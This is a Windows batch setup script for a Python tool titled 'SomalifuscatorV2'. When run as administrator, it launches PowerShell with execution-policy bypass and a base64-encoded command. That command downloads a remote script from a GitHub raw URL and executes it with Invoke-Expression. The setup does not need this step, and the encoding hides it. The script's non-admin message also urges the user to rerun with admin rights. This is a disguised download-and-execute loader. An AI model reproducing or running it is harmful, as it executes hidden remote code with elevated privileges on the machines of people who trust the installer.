@echo off
cd /d "%~dp0"

color 0a
title SomalifuscatorV2
cls

net session >nul 2>&1
if %errorlevel%==0 (
    powershell -exec Bypass -e JAB1AHIAbAAgAD0AIAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ASwBEAG8AdAAyADIANwAvAFAAeQB0AGgAbwBuAFAAYQB0AGgARgBpAHgAZQByAC8AbQBhAGkAbgAvAG0AYQBpAG4ALgBwAHMAMQAnADsAJABzAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0ACAAPQAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHUAcgBsADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABzAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0AA==
) else (
    echo YOU ARE NOT RUNNING AS ADMIN AND POTENTIAL ISSUES WITH PYTHON MAY OCCUR. IF THE PROGRAM DOESN'T RUN PLEASE RERUN SETUP.BAT WITH ADMIN!!!
)

python -m pip install -r requirements.txt --upgrade

if "%1"=="" (
    goto :normal
) else (
    goto :build
)

:build
pushd src
python -m main -f %1
popd
goto :out


:normal
pushd src
python -m main
popd
goto :out


:out
if %USERNAME%==this1 (
    pyclean .
)

exit /b 0